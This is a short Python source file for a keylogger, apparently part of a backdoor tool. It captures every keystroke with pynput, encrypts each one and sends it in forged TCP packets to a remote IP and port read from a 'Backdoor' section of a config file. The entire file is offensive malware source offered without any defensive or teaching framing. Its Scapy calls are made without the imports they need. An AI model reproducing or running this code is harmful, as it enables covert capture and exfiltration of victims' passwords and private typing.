from pynput import keyboard
import encryption
import ConfigParser

class Keylogger(object):
    def __init__(self):
        config = ConfigParser.ConfigParser()
        config.read('setup.config')

        self.remoteIP = config.get('Backdoor', 'remoteIP')
        self.remotePort = int(config.get ('Backdoor', 'remotePort'))
        self.localIP = config.get('Backdoor', 'localIP')
        self.localPort = int(config.get('Backdoor', 'localPort'))
        self.password = config.get('General', 'password')

        self.listener = keyboard.Listener(on_press=self.onPress)

    def onPress(self, key):
        try:
            keys = key.char
        except AttributeError:
            keys = '<' + str(key) + '>'

        self.send(keys)

    def start(self):
        if not self.listener.isAlive():
            self.listener = keyboard.Listener(on_press=self.onPress)
            self.listener.start()
            return True
        return False

    def stop(self):
        if self.listener.isAlive():
            self.listener.stop()
            return True
        return False

    def send(self, keys):
        payload = encryption.encrypt(self.password + keys)
        packet = IP(dst=self.remoteIP, src=self.localIP)/TCP(dport=self.remotePort, sport=self.localPort)/Raw(payload=payload)
        send(packet,verbose=False)
